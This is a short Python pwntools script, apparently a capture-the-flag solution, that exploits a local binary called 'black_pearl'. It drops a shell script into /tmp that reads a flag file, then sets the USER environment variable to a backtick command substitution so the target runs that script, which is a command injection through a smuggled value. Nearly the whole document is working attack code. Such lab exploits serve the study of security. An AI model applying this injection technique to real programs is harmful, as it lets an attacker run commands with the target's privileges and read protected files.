#!/usr/bin/env python3
from pwn import *
import os
import base64

# Temporary file path
TMP_PATH = '/tmp/prl.sh'

# The command we wish to run
CMD = '/bin/cat /Users/ctf/flag'

# Drop command to a temporary file
with open(TMP_PATH, 'w') as fp:
    fp.write('#!/bin/sh\n')
    fp.write(CMD)
os.chmod(TMP_PATH, 0o755)

# Set up the username to cause a command injection and a fake "console"
my_env = {}
my_env |= os.environ
my_env['USER'] = f'`{TMP_PATH}` console'

# Start the target
proc = process('/Users/ctf/black_pearl', env=my_env)
proc.interactive()

